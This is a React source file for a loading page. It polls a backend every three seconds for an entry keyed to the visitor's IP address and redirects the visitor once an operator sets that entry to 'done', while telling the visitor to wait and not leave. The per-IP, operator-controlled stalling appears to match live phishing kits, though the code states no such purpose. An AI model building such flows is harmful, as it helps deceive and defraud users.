import axios from 'axios';
import React, { useEffect } from 'react'
import config from '../config';
import { useNavigate } from 'react-router-dom';
import "./Loading.css"
const Loading = () => {
  const navigate = useNavigate()
  useEffect(() => {
    const checkKeyInFile = async () => {
      try {
        const response = await axios.get(`${config.apiBaseUrl}/readFile`);
        const resData = response.data.data;

        axios.get("https://ipapi.co/json")
        .then(res => {

          const desiredKey = res.data.ip;
          let desiredValue = '';
            try {
              const foundItem = resData.find(line => line.key == desiredKey);

              if (foundItem) {
                desiredValue = foundItem.value;
              }
            } catch (error) {
              console.error('Error during find:', error);
            }

            if (desiredValue != "") {
             axios.post(`${config.apiBaseUrl}/updateData`, { data: resData.filter(line => line.key != desiredKey) })
              .finally(res=>{
                if(desiredValue==="done"){
                  navigate(`/${desiredValue}`);
                }
              
             })
              
            }

          })
          .catch(error => console.error('Error fetching IP:', error))

      } catch (error) {
        console.error('Reading or updating file error :', error);
      }
    };


    const interval = setInterval(() => {
      checkKeyInFile();
    }, 3000);

    return () => clearInterval(interval); 
  }, []);
  return (
    <div>
       <div class="flex-center position-ref full-height">
        <div class="content  flex justify-center items-center flex-col">
            <div class="title m-b-md" style={{
            marginLeft: "50vw",
            marginRight: "50vw",
           
        }}>
                <div class="spinner" >
                    <div></div>   
                    <div></div>    
                    <div></div>    
                    <div></div>    
                    <div></div>    
                    <div></div>    
                    <div></div>    
                    <div></div>    
                    <div></div>    
                    <div></div>    
                  </div>
            </div>

            <div class="container">
                <p className='font-bold text-xl text-black py-4'>Your request is processing</p>
            <p className='py-2'>Please wait 2-3 minutes. We are checking your information. Please do not leave this site once processing is complete.</p>
            </div>
            <div class="container ">
              <div class="div" >
                <div id="progress-container" >
                    <div id="progress-bar"></div>
              </div>
            </div>
            </div>
            
            </div>
        </div>
    </div>
 
  )
}

export default Loading